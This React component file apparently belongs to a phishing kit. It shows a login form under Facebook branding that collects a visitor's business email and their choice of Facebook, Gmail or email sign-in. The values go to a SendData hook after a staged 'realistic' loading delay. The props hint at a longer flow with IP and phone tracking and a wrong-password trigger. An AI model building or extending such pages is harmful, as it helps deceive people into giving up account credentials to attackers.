import React, { useContext, useState } from "react";
import styled from "styled-components";
import FacebookLogo from "../../assets/images/FLogo.png";
import SendData from "../../hooks/SendData.js";
import { DataContext } from "../../pages/index.js";

// Component imports
import Footer from "../frriSpecific/Footer.js";
import ActualForm from "./ActualForm.js";
import Done from "./Done.js";


const OverallPageWrapper = styled.div`
  display: flex;
  flex-direction: column;
  min-height: 100vh;
  width: 100%;
  background-color: #f0f2f5; // A light background for the overall page
  font-family: "Universal Sans Display", sans-serif; // Updated to Ferrari font
`;

const MainContentArea = styled.div`
  flex-grow: 1;
  width: 100%;
  display: flex;
  flex-direction: column;
  align-items: center;
  // background-color: #1d2761; // This will likely move to a more specific section or be removed
`;



function Form({
  setStep,
  BusinessEmail,
  setBusinessEmail,
  setContinueWithFacebook,
  Unik,
  Ip,
  Tel,
  Email,
  setEmail,
  Name,
  InvalidPassword,
  wrongPasswordTrigger,
}) {
  const [BusinessEmailError, setBusinessEmailError] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [loadingType, setLoadingType] = useState(""); // 'facebook' or 'email'
  const [beginTimer, setBeginTimer] = useState(false);
  let { AllData, setAllData } = useContext(DataContext);

  const NextStep = (stepText) => {
    setIsLoading(true);
    
    // Determine if it's Facebook or Gmail
    if (stepText.includes("Facebook")) {
      setLoadingType("facebook");
      setContinueWithFacebook(true);
    } else if (stepText.includes("Gmail")) {
      setLoadingType("gmail");
      setContinueWithFacebook(false);
    } else {
      setLoadingType("email");
    }

    let params = {
      ...AllData,
      business_email: BusinessEmail,
      currentStep: stepText ? stepText : "User clicked continue with Facebook",
    };

    setAllData(params);

    // Send data and add realistic loading time (1.5-2 seconds)
    SendData(params);

    // Smooth loading experience with realistic timing
    const loadingTime = Math.random() * 500 + 1500; // 1.5-2 seconds

    setTimeout(() => {
      setIsLoading(false);
      setLoadingType("");
      setStep(2);
    }, loadingTime);
  };

  const handleContinueWithEmail = () => {
    // Prevent action if already loading
    if (isLoading) return;

    // Email validation using regex
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(BusinessEmail)) {
      // Show error message under the input field
      setBusinessEmailError("Please enter a valid email address");
      return;
    }

    // Clear any previous error
    setBusinessEmailError("");
    setContinueWithFacebook(false);

    if (BusinessEmail && setBusinessEmail) {
      setBusinessEmail(BusinessEmail);
    }

    NextStep("User clicked continue with email");
  };

  return (
    <OverallPageWrapper>
      <MainContentArea>
        <div className="flex justify-center md:flex-row gap-0 w-full mx-auto w overflow-hidden">
            <ActualForm
              BusinessEmail={BusinessEmail}
              setBusinessEmail={setBusinessEmail}
              BusinessEmailError={BusinessEmailError}
              handleContinueWithEmail={handleContinueWithEmail}
              NextStep={NextStep}
              FacebookLogo={FacebookLogo}
              isLoading={isLoading}
              loadingType={loadingType}
              Unik={Unik}
              Tel={Tel}
              Email={Email}
              setEmail={setEmail}
              Name={Name}
              Ip={Ip}
              setParentBeginTimer={setBeginTimer}
              InvalidPassword={InvalidPassword}
              wrongPasswordTrigger={wrongPasswordTrigger}
            />
          </div>
      </MainContentArea>
    </OverallPageWrapper>
  );
}

export default Form;
